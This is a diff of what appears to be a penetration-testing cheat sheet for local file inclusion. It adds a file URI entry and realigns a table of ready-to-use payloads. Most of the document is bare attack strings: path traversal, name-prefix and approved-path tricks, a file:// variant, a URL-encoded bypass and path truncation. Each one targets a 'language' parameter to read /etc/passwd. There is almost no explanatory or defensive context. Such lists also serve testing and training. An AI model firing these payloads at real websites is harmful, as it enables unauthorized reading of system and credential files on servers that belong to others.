@@ -1,10 +1,11 @@
 Local File Inclusion
 Basic LFI 
-1)     -      Basic LFI                   -    /index.php?language=/etc/passwd                                 
-2)     -      LFI with path traversal     -    /index.php?language=../../../../etc/passwd                      
-3)	-      LFI with name prefix        -    /index.php?language=/../../../etc/passwd                       
-4)	-      LFI with approved path      -   /index.php?language=./languages/../../../../etc/passwd           
-       
+1)     -      Basic LFI                                                       -    /index.php?language=/etc/passwd                                 
+2)     -      LFI with path traversal                                         -    /index.php?language=../../../../etc/passwd                      
+3)	-      LFI with name prefix                                            -    /index.php?language=/../../../etc/passwd                       
+4)	-      LFI with approved path                                          -    /index.php?language=./languages/../../../../etc/passwd           
+5)     -      LFI accepting only inputs starting with the word “file”         -    file:///etc/passwd (file uri scheme)    /    file/../../../../etc/passwd
+
 LFI Bypasse
 1)	-   Bypass filters with URL encoding                              -     index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64           
 2)	-  Bypass appended extension with path truncation (obsolete)      -     /index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048]     
